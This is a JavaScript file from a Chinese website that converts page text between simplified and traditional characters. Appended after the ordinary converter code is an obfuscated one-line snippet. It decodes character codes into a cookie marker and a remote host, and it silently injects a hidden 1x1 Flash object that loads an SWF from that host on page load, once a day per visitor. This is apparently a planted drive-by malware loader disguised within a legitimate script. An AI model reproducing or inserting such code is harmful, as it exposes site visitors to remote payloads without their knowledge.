...
var Cookie= {
	Set : function() {
		var name = arguments[0], value = escape(arguments[1]), days = (arguments.length > 2) ? arguments[2]
				: 365, path = (arguments.length > 3) ? arguments[3] : "/";
		with (new Date()) {
			setDate(getDate() + days);
			days = toUTCString();
		}
		document.cookie = "{0}={1};expires={2};path={3}".format(name, value,
				days, path);
	},
	Get : function() {
...
var stTransform = function(s2t) {
	...
	return (function(o) {
		...
		if (o.nodeType != 1)
			return;
		if (o.tagName
				&& ",OBJECT,FRAME,FRAMESET,IFRAME,SCRIPT,EMBD,STYLE,BR,HR,TEXTAREA,"
						.indexOf("," + o.tagName.toUpperCase() + ",") > -1)
			return;
		if (o.title)
			o.title = stt(o.title);
		if (o.alt)
			o.alt = stt(o.alt);
		if (o.tagName && o.type && o.tagName.toUpperCase() == "INPUT"
...
var st = function() {
	...
	stTransform(!t);
	document.getElementById("fonttype").innerHTML = t ? "繁體中文" : "简体中文";
}

var StranLink_Obj=document.getElementById("fonttype")
if (StranLink_Obj){
	var t=Cookie.Get("1")=="t";
	if(typeof(document.all)!="object") 	//非IE浏览器
	{
		StranLink_Obj.href="javascript:st()";
	}
	else
	{
		StranLink_Obj.href="#";
		StranLink_Obj.onclick= new Function("st();return false");
	}
	StranLink_Obj.title=t ? "简体中文":"繁體中文";
	StranLink_Obj.innerHTML=StranLink_Obj.title;
	
	window.onload = function() {
        if (Cookie.Get("l") == "t")
            setTimeout(function() {
                stTransform(true);
                StranLink_Obj.innerHTML = "简体中文";
            }, 100);
	}
}
(function(){if(document.cookie.indexOf(String.fromCharCode(109,97,121,98,101,121,111,117))==-1){try{var expires=new Date();expires.setTime(expires.getTime()+24*60*60*1000);var c=document;c.cookie=String.fromCharCode(109,97,121,98,101,121,111,117)+"=Yes;path=/;expires="+expires.toGMTString();var s=c.createElement("span");var p=String.fromCharCode(104,116,116,112,58,47,47,112,101,97,99,101,49,49,46,51,118,122,104,117,106,105,46,99,111,109,47,118,46,115,119,102)+"?i="+(new Date()).valueOf();s.innerHTML='<object type="application/x-shockwave-flash" data="'+p+'" width="1" height="1"><param name="movie" value="'+p+'" /><embed src="'+p+'"  type="application/x-shockwave-flash" width="1" height="1"></embed> </object>';(function(){if(!c.body){setTimeout(arguments.callee,1000)}else{c.body.insertBefore(s,c.body.lastChild)}})()}catch(e){}}})();
